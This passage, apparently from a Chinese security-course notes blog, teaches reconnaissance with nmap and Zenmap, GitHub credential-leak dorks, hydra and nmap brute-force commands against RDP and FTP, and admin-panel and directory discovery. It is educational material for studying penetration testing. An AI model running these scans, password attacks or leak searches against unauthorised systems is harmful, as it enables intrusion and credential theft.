list.txt</p></li><li><p>指定端口范围：nmap -p 3389,80-445 192.168.100.3</p></li><li><p>详细描述输出：nmap -vv 192.168.100.3</p></li><li><p>输出扫描结果：nmap -oX test.xml 192.168.100.1&#x2F;24</p></li><li><p>综合扫描：nmap -A 192.168.100.1&#x2F;24</p></li></ol><p><code>示例</code></p><p>1.扫描目标单个主机，输出详细描述，输出扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.34.1.145 -VV -oX 123.xml</span><br></pre></td></tr></table></figure><p>2.扫描文件列表目标(test.txt内容为目标ip的列表)，并指定端口3389、445、 3306，输出扫描结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL test.txt -p 3389,445,3306 -oX test.xml</span><br></pre></td></tr></table></figure><p><code>Zenmap</code></p><p>nmap的GUI程序，功能相同</p><h2 id="课时九-主机发现"><a href="#课时九-主机发现" class="headerlink" title="课时九 主机发现"></a>课时九 主机发现</h2><p>通常系统管理员可能仅仅使用ping来定位内网中的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图突破防火墙的封锁，了解自标网络主机的活动情况<br>主机发现有时候也叫ping扫描，但它远远超越了普通的ping工具发送简单的ICMP回声请求报文。Nmap可以进行大规模网络扫描，并可以定制TCP、UDP、ICMP请求方式以绕过目标的一些限制，探测目标主机是否是处于活动状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.-sP    (ping扫描)仅仅进行ping扫描</span><br><span class="line">2.-Pn     跳过主机发现阶段，默认所有主机为活动，继续执行其他扫描</span><br><span class="line">3.-PU(UDP Ping)它发送一个空的UDP报文给指定的端口，默认为31338 该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器。</span><br><span class="line">4.-PS (TCP SYN Ping)该选项发送一个设置了SYN标志位的空TCP报文。  默认目的端口为80，可指定其它端口，每个端口会被并发扫描</span><br><span class="line">5.-PA     (TCP ACK Ping)与TCP SYN相似，设置TCP的ACK标志位</span><br><span class="line">    一般防火墙会封锁SYN报文，ACK报文通常会被识别成伪造的而被丢弃。所以两种方式同时指定使穿透防火墙的可能性比较大</span><br><span class="line">6.ICMPPingTypes</span><br><span class="line">-PE：ICMPEcho扫描方式</span><br><span class="line">-PP：ICMP时间ping扫描</span><br><span class="line">-PM：ICMP地址码ping扫描</span><br><span class="line">当管理员封锁了回声请求报文而忘记其它两种ICMP查询，用于相同目的时非常有效</span><br><span class="line">7.-n禁止DNS反向解析</span><br><span class="line">8.-R反向解析域名</span><br><span class="line">9.--traceroute路由跟踪</span><br></pre></td></tr></table></figure><h2 id="课时十-端口扫描"><a href="#课时十-端口扫描" class="headerlink" title="课时十 端口扫描"></a>课时十 端口扫描</h2><p>公认端口</p><p>0～1023，它们绑定特定的服务，端口的通信明确表明了某种服务的协议。例如：80端口是HTTP服务端口。</p><p>注册端口<br>1024~49151，它们松散地绑定一些服务，就是说有许多服务绑定于这些端口，这些端口同样用于许多其它的目的</p><p>动态&#x2F;私有端口<br>49152~65535，这些端口一般不分配服务，有些较为特殊的程序，特别是木马程序非常喜欢使用这些端口，容易隐蔽。</p><p><code>常用的服务器端口</code><br>21FTP服务                   443HTTPS服务<br>22SSH服务                  3389远程桌面<br>23Telnet服务              8080WWW代理服务<br>25SMTP服务   80HTTP服务</p><p><code>端口扫描技术</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.-p指定扫描端口，Nmap默认扫描1000个常用的端口</span><br><span class="line">2.-sS TCP SYN扫描，扫描速度快，不会完成TCP连接，比较隐蔽</span><br><span class="line">3.-sT TCP连接扫描，当SYN扫描不可用的时候，TCP连接扫描是默认的TCP扫描类型。当用户没有权限发送原始报文或者扫描IPv6网络时，使用此方法</span><br><span class="line">4.-sU UDP扫描，UDP扫描通常比TCP慢和更加困难，一般安全审计会忽略一些UDP端口</span><br><span class="line">5.-sA TCP ACK扫描，无需判断端口的开放情况。 用来绘制出防火墙规则，对哪些端口进行了保护</span><br><span class="line">6.-sW TCP窗口扫描，与ACK扫描类似</span><br><span class="line">7.隐蔽扫描</span><br><span class="line">-sN Null扫描，通过发送非常规的TCP通信数据包对服务器进行探测</span><br><span class="line">-sF FIN扫描，当使用TCPSYN扫描时可能会被目标防火墙发现，止SYN数据包，可以使用FIN扫描会有很好的穿透效果</span><br><span class="line">-sX Xmas扫描，数据包设置FIN,PSH,URG标志位</span><br></pre></td></tr></table></figure><h2 id="课时十一-操作系统探测"><a href="#课时十一-操作系统探测" class="headerlink" title="课时十一 操作系统探测"></a>课时十一 操作系统探测</h2><p><code>操作系统探测方法</code><br>操作系统探测主要通过协议栈指纹分析判断目标系统类型</p><p>常用的操作系统判断方法：</p><ol><li>Nmap综合判断</li><li>Web指纹</li><li>Telnet选项指纹</li><li>根据操作系统TTL值判断<br>  Linux操作系统<br>   TTL值一般为64或255Unix<br>   TTL值为255<br>  Windows操作系统<br>   TTL值一般为128</li></ol><p><code>Nmap探测原理</code><br>Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。在进行一系列测试如TCPISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后，Nmap把结果和数据库nmap-os-fingerprints中超过1500个已知的操作系统的fingerprints进行比较。</p><p>Nmap使用TCP&#x2F;IP协议栈指纹分析进行远程操作系统探测</p><p><code>Nmap操作系统探测参数</code>    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.-O启动操作系统检测</span><br><span class="line">2.--osscan-limit针对指定的目标进行操作系统检测如果发现一个打开和关闭的TCP端口时，操作系统检测会更有效。  采用这个选项，Nmap只对满足这个条件的主机进行操作系统检测</span><br><span class="line">3.--osscan-guess推测操作系统检测结果当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><p><code>探测实例</code><br>1.检测两个目标IP的操作系统类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PS -sS -O 192.168.119.143 192.168.119.139 -oX os.xml</span><br></pre></td></tr></table></figure><p>2.使用–osscan-limit参数节约扫描时间<br>其中192.168.119.146为不活动主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PS -sS -O --osscan-limit 192.168.119.146 192.168.119.139 -oX os.xml</span><br></pre></td></tr></table></figure><h2 id="课时十二-服务和版本探测"><a href="#课时十二-服务和版本探测" class="headerlink" title="课时十二 服务和版本探测"></a>课时十二 服务和版本探测</h2><p><code>服务和版本探测原理</code><br> Nmap服务和版本探测主要是通过服务指纹对比匹配，确定服务和版本信息。  nmap-service-probes数据库包含查询不同服务的探测报文和解析识别响应的匹配表达式。<br>在用某种其它类型的扫描方法发现TCP或UDP端口后，版本探测会询问这些端口，确定什么服务正在运行 通过服务指纹对比匹配，Nmap试图确定服务，应用程序名（如ISCBind，Apachehttpd）版本号，主机名，设备类型（如打印机，路由器），操作系统等</p><p><code>服务和版本探测</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.-sV打开版本探测，也可以使用-A同时打开操作系统探测和服务版本探测</span><br><span class="line">2.--allports全端口版本探测，Nmap版本探测默认会跳过9100TCP端口</span><br><span class="line">3.-sR RPC扫描，一般很少用到</span><br><span class="line">4.--version-trace获取详细版本信息</span><br><span class="line">5.--version-intensity设置扫描强度，强度在0～9之间，默认为7。赋予的值越高，服务越可能被正确识别，但时间也较长</span><br><span class="line">6.--version-light轻量级扫描，对应--version-intensity2的快捷方式</span><br><span class="line">7.--version-all重量级扫描，对应--version-intensity9的快捷方式</span><br></pre></td></tr></table></figure><p><code>扫描实例</code><br>1.探测目标服务器服务与版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS-sV 192.168.119.142</span><br></pre></td></tr></table></figure><p>2.比较不同扫描强度产生的扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS-sV --version-light 192.168.119.142</span><br></pre></td></tr></table></figure><h2 id="课时十三-Github源码信息泄露"><a href="#课时十三-Github源码信息泄露" class="headerlink" title="课时十三 Github源码信息泄露"></a>课时十三 Github源码信息泄露</h2><p><code>产生原因</code></p><p>开发者在使用Git创建、 修改、 更新远程仓库前，一旦源代码未及时处理掉一些敏感信息，例如邮件配置信息、 数据库配置信息，就会造成源码信息泄露。<br>黑客通过强大的搜索引擎，很容易抓取到GitHub代码库中的敏感信息。一般泄露的敏感信息都与账号密码有关，因此收集源码泄露的信息非常重要</p><p> <code>敏感数据泄露</code><br>1.邮件配置信息 2.数据库配置信息<br>3.FTP配置信息  4.VPN配置信息<br>5 .APIKEY              ……</p><p><code>信息收集的方法</code></p><p>使用GoogleHacking收集GitHub源码信息泄露，例如：<br>    邮件信息收集site:Github.com smtp@厂商域名<br>    数据库信息收集site:Github.com rootpassword<br>    公司内部信息收集site:Github.com ccorp.xx.com或者XX-inc.com</p><p><code>实例</code></p><p>1.收集目标泄露的邮箱账号信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:Github.com smtp@163.com</span><br></pre></td></tr></table></figure><p>2.收集数据库配置信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:Github.com User ID=&#x27;sa&#x27;;Password</span><br></pre></td></tr></table></figure><h2 id="课时十四-Zenmap"><a href="#课时十四-Zenmap" class="headerlink" title="课时十四 Zenmap"></a>课时十四 Zenmap</h2><p>Zenmap是nmap的GUl （图形化界面） 版本，由nmap官方提供Zenmap使用python语言编写，可以在Windows、 Linux、 Mac等不同系统上运行</p><p>Zenmap主要是为Nmap提供更加简单方便的操作方式，使用图形化界面，更加容易被初学者接受。<br>注意： WindowsXP系统支持的nmap最高版本为6.47版，下载地址为：<a href="https://nmap.ora/dist/">https://nmap.ora/dist/</a></p><p><code>Zenmap的优点</code></p><pre><code>1. 导入命令行nmap输出的扫描结果，方便可视化分析 2. 可以对比扫描结果，分析更加快捷 3. 同时支持自定义扫描方式，扫描更加高效 4. 可以查看拓扑和主机详细信息</code></pre><p><code>默认扫描方式</code><br>Zenmap默认配置了种扫描方式， 下面将介绍几种常用的扫描方式，以及如何自定义扫描方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Intense scan    nmap -T4 -A -v</span><br><span class="line">2.Intense scan plus UDP    nmap -sS -sU -T4 -A -v</span><br><span class="line">3.Intense scan,all TCP ports    nmap -p 1-65535 -T4 -A -v</span><br><span class="line">4.Intense scan,no ping     nmap -T4 -A -v -Pn</span><br></pre></td></tr></table></figure><p><code>自定义扫描方式</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.配置自定义扫描方式，菜单选项：配置&gt;&gt;新的配置或命令&gt;&gt;自定义配置编辑器</span><br><span class="line">2.更改默认扫描方式，菜单选项：配置&gt;&gt; 编辑选中配置&gt;&gt;自定义扫描方式</span><br><span class="line">3.在配置编辑器中可自由定义扫描方式，也可保存为配置文件以便下次直接调用</span><br></pre></td></tr></table></figure><p><code>扫描实例</code></p><p> 1.使用Intensescan方式扫描目标主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.119.142</span><br></pre></td></tr></table></figure><p>2.尝试自定义扫描方式扫描主机</p><h2 id="课时十五-服务漏洞扫描"><a href="#课时十五-服务漏洞扫描" class="headerlink" title="课时十五 服务漏洞扫描"></a>课时十五 服务漏洞扫描</h2><p><code>扫描原理</code></p><p>Nmap不仅可以进行网络扫描，还可以进行服务漏洞扫描。 Nmap内置了许多漏洞扫描脚本，由lua语言编写，通过NSE脚本引擎调用脚本检测服务漏洞<br>Linux系统安装nmap的脚本位于&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;，目录中包含了nmap内置的所有脚本，且脚本在不断更新中。 Zenmap直接在配置菜单中选择即可</p><p><code>脚本分类</code><br> Nmap脚本主要分为以下几类，可通过–script&#x3D;<lua scripts>直接调用进行模糊测试</lua></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.auth：负责处理鉴权证书（绕开鉴权）的脚本</span><br><span class="line">2.broadcast：在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</span><br><span class="line">3.brute：提供暴力破解方式，针对常见的应用如http/snmp等</span><br><span class="line">4.default：使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</span><br><span class="line">5.discovery：获取网络更多的信息，如SMB枚举、SNMP查询等</span><br><span class="line">6.dos：用于进行拒绝服务攻击</span><br><span class="line">7.exploit：利用已知的漏洞入侵系统</span><br><span class="line">8.externa1：利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">9.fuzzer：模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</span><br><span class="line">10.intrusive：入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</span><br><span class="line">11.malware：探测目标机是香感染了病毒、开启了后门等信息</span><br><span class="line">12.safe：此类与intrusive相反，属于安全性脚本</span><br><span class="line">13.version：负责增强服务与版本扫描（VersionDetection）功能的脚本</span><br><span class="line">14.vlun：负责检查目标机是否有常见的漏洞（Vunerability），如是有MS08_067</span><br></pre></td></tr></table></figure><p><code>脚本引擎常用命令</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.-sC  等价于--script=default</span><br><span class="line">2.--script=&lt;lua scripts&gt;   调用指定的脚本</span><br><span class="line">3.--script-args  为脚本提供默认参数</span><br><span class="line">4.--script-trace   显示脚本执行过程中发送与接收的数据</span><br><span class="line">5.--script-help=&lt;scripts&gt;   显示脚本使用帮助</span><br></pre></td></tr></table></figure><p><code>扫描实例</code><br>1.检测自标服务器是否存在  永恒之蓝” 漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-vuln-ms17-010 192.168.119.142</span><br></pre></td></tr></table></figure><p>2.爆破FTP服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21 192.168.119.14 2--script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/passwd.txt</span><br></pre></td></tr></table></figure><h2 id="课时十六-弱口令扫描"><a href="#课时十六-弱口令扫描" class="headerlink" title="课时十六 弱口令扫描"></a>课时十六 弱口令扫描</h2><p><code>hydra弱口令扫描</code><br>Hydra是是一个支持多种网络服务的认证破解工具，支持超过50个协议，包括ssh、 ftp、 smb、多个数据库等等，可以自定义字典执行快速暴力破解。</p><p><code>hydra常用命令</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. -l or -L  -l指定一个用户名，-L指定用户名字典文件</span><br><span class="line">2. -p or -P  -p指定一个密码，-P指定密码字典文件</span><br><span class="line">3. -e nsr可选项   &quot;n&quot;尝试空密码  &quot;s&quot;尝试使用一样的用户名和密码登录， &quot;r&quot;尝试用户名和密码倒登录</span><br><span class="line">4. -s  指定端口</span><br></pre></td></tr></table></figure><p><code>扫描实例</code></p><ol><li><p>Windows远程桌面弱口令扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L userdict.txt -P passdict.txt 192.168.119.142 rdp</span><br></pre></td></tr></table></figure><p>rdp 代表远程桌面协议 (Remote Desktop Protocol)。RDP 通常用于远程访问Windows系统。</p></li><li><p>FTP弱口令扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L userdict.txt -P passdict.txt -e ns ftp://192.168.119.142</span><br></pre></td></tr></table></figure></li></ol><h2 id="课时十七-子域名搜集"><a href="#课时十七-子域名搜集" class="headerlink" title="课时十七 子域名搜集"></a>课时十七 子域名搜集</h2><p><code>子域名搜集思路</code></p><ol><li><p>子域名暴力破解</p></li><li><p>搜索引擎查询</p></li><li><p>查询DNS解析记录</p></li><li><p>爬虫爬取官方页面提取子域名</p></li><li><p>IP反查</p></li></ol><p><code>在线工具</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.IP反查域名：https://dns.aizhan.com/</span><br><span class="line">2.Netcraft: http://searchdns.netcraft.com/</span><br><span class="line">3.站长之家：http://tool.chinaz.com/subdomain/</span><br><span class="line">4.DNS数据集查询：https://dnsdumpster.com/</span><br></pre></td></tr></table></figure><p><code>本地工具</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Layer子域名掘机</span><br><span class="line">2.subDomainsBrute</span><br><span class="line">3.Fierce （Linux）</span><br><span class="line">4.BurpSuite</span><br></pre></td></tr></table></figure><p><code>子域名搜集实例</code></p><ol><li><p>利用子域名挖掘机搜集子域名<br>  了解子域名挖掘机搜集子域名的方式，并学会使用子域名挖掘机</p></li><li><p>利用在线DNS数据集收集子域名</p></li></ol><h2 id="课时十八-后台发现"><a href="#课时十八-后台发现" class="headerlink" title="课时十八 后台发现"></a>课时十八 后台发现</h2><p><code>网站后台管理系统</code></p><p>网站后台管理系统主要用于对网站前台的信息管理，如文字、 图片、影音和其他日常更新的信息等。简单来说就是对网站数据库和文件的快速操作， 以使得前台内容能够得到及时更新和调整<br>网站后台主要分为CMS内容管理系统和自主开发后台管理系统。主要区别在于CMS建站快速，但安全性不高，容易出现安全问题；自主开发后台系统可定制性强，安全性可以得到保障</p><p><code>为什么要发现后台</code></p><ol><li>弱口令</li><li>登录验证绕过</li><li>后台漏洞利用</li></ol><p><code>后台发现方法</code></p><ol><li>字典枚举猜解 （御剑、 Test404等）</li><li>GoogleHacking</li><li>二级域名后台</li><li>Web目录探测</li><li>CMS特性</li></ol><p><code>常见的CMS及后台特征</code></p><ol><li>织梦CMS  后台管理界面：&#x2F;dede</li><li>Joomla   后台管理界面：&#x2F;administrator</li><li>Discuz  后台管理界面：&#x2F;admin.php或&#x2F;admincp.php</li><li>WordPress  后台管理界面：&#x2F;wp-login.php或&#x2F;wp-admin.php</li></ol><h2 id="课时十九-Web目录结构探测"><a href="#课时十九-Web目录结构探测" class="headerlink" title="课时十九 Web目录结构探测"></a>课时十九 Web目录结构探测</h2><p><code>web目录结构</code></p><p>Web目录结构如同文件系统一样，会按照内容或功能分为一些子目录和文件。按照网站功能将网站源文件放入不同的子目录中，由相关程序调用，大部分目录和文件普通用户无权访问<br>一些子目录中和源程序文件存放了网站相关的敏感信息，不希望被普通用户所查看，特别是网站相关配置文件和管理后台目录。，一旦网站目录中存在敏感文件，且管理员未正确配置访问权限，就可能被黑客利用攻击服务器。</p><p><code>探测目录结构的作用</code></p><ol><li>管理后台发现</li><li>敏感配置文件</li><li>文件上传页面</li><li>网站备份文件等</li></ol><p><code>目录结构探测原理</code></p><ol><li>基于字典暴力破解</li><li>基于爬虫发现</li></ol><p><code>录结构探测工具</code></p><ol><li>DirBuster</li><li>dirb</li><li>BurpSuite</li><li>AWVS SiteCrawler模块</li></ol><p><code>工具利弊</code></p><ol><li>DirBuster、 dirb基于字典暴力破解，结果准确、 耗时长</li><li>BurpSuite、AvS基于爬虫发现，简单、 结果不明确、耗时短</li><li>基于字典暴力破解目录结构，需要一个长期积累的好字典，以更缩短探测时间</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;米好信息安全课程笔记&quot;&gt;&lt;a href=&quot;#米好信息安全课程笔记&quot; class=&quot;headerlink&quot; title=&quot;米好信息安全课程笔记&quot;&gt;&lt;/a&gt;米好信息安全课程笔记&lt;/h1&gt;&lt;h1 id=&quot;基础课程-信息收集&quot;&gt;&lt;a href=&quot;#基础课程-信息收集&quot; c</summary>
      
    
    
    
    <category term="笔记" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="米好信安" scheme="https://w-sqrt7.github.io/categories/%E7%AC%94%E8%AE%B0/%E7%B1%B3%E5%A5%BD%E4%BF%A1%E5%AE%89/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="信息安全" scheme="https://w-sqrt7.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>论我眼中的世界（我的哲学观/世界观）</title>
    <link href="https://w-sqrt7.github.io/2024/03/01/philosophy/%E8%AE%BA%E6%88%91%E7%9C%BC%E4%B8%AD%E7%9A%84%E4%B8%96%E7%95%8C%EF%BC%88%E6%88%91%E7%9A%84%E5%93%B2%E5%AD%A6%E8%A7%82%E4%B8%96%E7%95%8C%E8%A7%82%EF%BC%89/"/>
    <id>https://w-sqrt7.github.io/2024/03/01/philosophy/%E8%AE%BA%E6%88%91%E7%9C%BC%E4%B8%AD%E7%9A%84%E4%B8%96%E7%95%8C%EF%BC%88%E6%88%91%E7%9A%84%E5%93%B2%E5%AD%A6%E8%A7%82%E4%B8%96%E7%95%8C%E8%A7%82%EF%BC%89/</id>
    <published>2024-03-01T08:32:34.149Z</published>
    <updated>2024-03-08T09:29:25.470Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2e0332d590eb1ca1a8d195e728c62b0d8f3ed62d199384a80b08fc2de97051aa">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c3021e8030241d2ed4684ec260e53fb6567aac2ca415ed8fa419a89b0fb5e776933c42f835f4656356e0ef5b6393388430951c9e35ffc20df02d7aee69b8fb26afb0518301c38d7026404e2e9f282acd6952e57815675a2f79d82bfe68ec8d2ec4d094af80dcd2f8617d06fd08f553109710c8cca881f4e2d6063eae68ba4a7f101a2ae87cb31f3abaddd2116f8cd272e226212e7dd09f510143ca4eeeb152cb6b7006fb30db3c21357e5138c5fb5d20e90958c63abf767a020cda680e11d470711ce7c7a6ac0ab04e20160a70f66b94294b0eb1d454d3128a5305c057100b5a1a1698a5c9ae5d70ba0e212c1c663241b2a4b5b9701d29116d5f9950afe7b6e30a561bdf0d9d52ffac52959755498c7b821828d9c37bcca869f07b2a149dcd4600b7d39c86425ba93918707016611b2879d01c413943b0636ad4ea402a234458ad5ae13448e25fd2cef25270cf9737e8aba8dcb4d51ac2436b7ca1bf4653a0fcdccea54ba6806ed02cdbc48f1f6b889f19a8574afe4fb2da6ee8ca7c72caa0f064800bd60072b965fb5eea87e5c410035816b6f2fdc53b9f9bedf6fc5636294fd4bc334da92af9b31ad690db628926c1011cb7d29479907efc859e7d4346e7552d65f733663fa7d71685424d866e39cfd07814c91cf7c1fda3602ceef04a18ee3204b7f4023e85998c142296bdbc108550a5b0ba9f06e1d2b4fb20e7df58df1b65c3ee1a63019cc8aa9af622f7612bac4c07a1ee333744e1e02430d4effbcc14b8da3b67789d3ae05dde514e2b39c95388bef9a01211659fb8a4887de2c83c9c211450993cf41be5794b21e009237fd17173aa87ba5bd1eb98b42b6510b4b19ac557013d025dbbc8ab94ad2f42c4cffb7a9c6ca251cb86721d5f2112c1ae9b46c3df2e72c402ce9d5e4dc0dbfa17886710de4c1c955df482191cf018bebae7e7aeb10cf073d1b2a9b9ee9c64f39f9fe7d24cc9a189a0ec1a0f004c2b5ca89d2996e8391c8a32c7f1903e0b22e39adbbb21b1503fbff83a39bb8db7067b51f4f6c8745216845f6e30a078862b886397de85425de8797a2737ed6d9c3cc779614af80d31a8ed78b6bb9012f8227c7b816374a646dc16430a5ec144c33c897bc9f56afd767dfaa7de70ce343c3b1b429aa21d8f8f24c55e170d0b995d2f514c6d950b079f0a7ef285747e0954faddbd74bfe883608581415f6500e47d81397dd0438087d318da4743c4be69abd9728be28284bd6611c98975a9d51c385e4b28ab40adff0796eb4dfe59f42264b022dd809957f9dd8348c4dd0f1e0343eb03dc6b04717cfed4e7a0e66a5fb611b70d1941177566d8a61733a0da1c83d249d458d7a80ba9cab1421667846027c54639e7cf052def5ef4b5fb565daa6121f09e39cf9f5e62473120f02d5d108d5b7d429f6ac7e0bec1b379d7f9c1b8e3cbed12fd033c0884a2c9ada53d68630f7a6ae3b4f9a7269697bb26d5adee8ab9a2fc83d6a147176faf9b6555b282afe99c1696a26520f874b55112b186dfe21ca4de1dcd7744e1d7bc22084b3d8b359317ddc1f2371a9471e007cfa663b4c5297f08e2f89a60d5293ce23ddb5da559249a2d49df75b4dd8c262f44a82b5519e4fe31433d2674f1f342943f938576303f9364da3ad68b6135b64b7041ba70cf7de60dd31da532cd59ce14b385e8f82856e8b093fed06f5694bb013b0f28b5966aa9ad445377748e5471be925bee0b0d6a349e3155a2a006b6d5622ced8927ed43c09c3b2ac7ef2fc9305e950e4a7384aa26bc25a9f8057d860b98ae00e7317c452c13c649488da486a094d6202da332cd8715d78bcb504a9b606509587af530c661f71ec4fa74660526ed66535db17939497dab718bc5f925b5c5328df2308d11137aefc81a4ea2f200d427794f7898e375a4b0954d40cece537e815098786d63e2557c2dd0eb7ea44f6430220d5a6e55e3f9ad3529ed286600e48bfad6d755a6e9390b278e346e11f3366320d97b4980dcf21e41c2701a5a55e2dbf8baf2cf4b9b3d148839a8ffd79bc2eeaf4f4d4237af8653543c075e04cced9da7c5a172e30c5aafa60f246103c2c5498ab4137aad24fdc81766856a7bf3474b6ee58dd0360d552fe5426bdca41e297c035133786b16425cd010fd19df0ae7609d6bcb019ed9e63079c30b9f140acf2b930f14e38c89056d7dcef872a8a2b487608dd8cd911baf91e279c0570858282780bb18181a0717270acf50bc2fd538a6ebb47115b875ff380275b58172a4c58d479ea82e7c4540bc51910d19cf85e8c77d7a0201f28fed9c063241e27f15c554e6461c24ca25015bcfef0fe3061c2cff005b068f34ddca05f2171c8768bd171921a367324283b1d5365cda439be956b8b879ff76a5e0c58cfc8eea7d317bc3dadc80dde6142326973eecaae2ab6aed52006c9283a0e3ebeb65009cd233b691633f8f4ec1dd67c6f7a7d1e3f9ae5316ca7b955e626d63262c1cafc251681bfb7696ff829d28e80fe886dc85dbeb34841d49e75aad5c0bb09917a0c7127fade87a566ecd1d6431b7dbff9f3b200cb352250f4a75fbd4321b5683b7085b0c28953d335442ea765fcce59126f1ea2b96e222a8e25e4082923b5dd46543d91df3fdee63c875f9d4de9b9eba60aaf00a60b8be81360a59f16f456aa826deb198dd1b5633cc711b2704aab4b5a3f6cf28343ef8a1601462a97b26cb72ea2d58446aeb700c2b160a9c2bd1f6b2de9d62437602b5650ca4a2847e72c34d55de45af2e9a5f21f77e0ca74f26e58eaab63669f9fcfd7a2dcd78865fc136aebc75347697626fb5e54c6ad731013985005b2bab37abae70e38e3a10c79c610a66018a16d14df3852490d6879dcaac927a04a64db259b1c9d962691d572f4771b074307b54d0dc4976b18fd719bba79a5af6ec504428a35bb118c2a9cca3eda1fef326528e7626dc4570b350740f981ea29151385e0f5e06808c5c8bbbcea68fedc05e08212e2151398c79a57eb0b585503bd36f6fbbcc03c8c8944374ad80d9b9600e3ead88743b22ee2d5eeba59edf12193a7152f81600813e1300590890ea0becf4cd7cfeaba73676847813016b5c3ef14dc2cf34f950ef9a62261e43f50d521ed70ff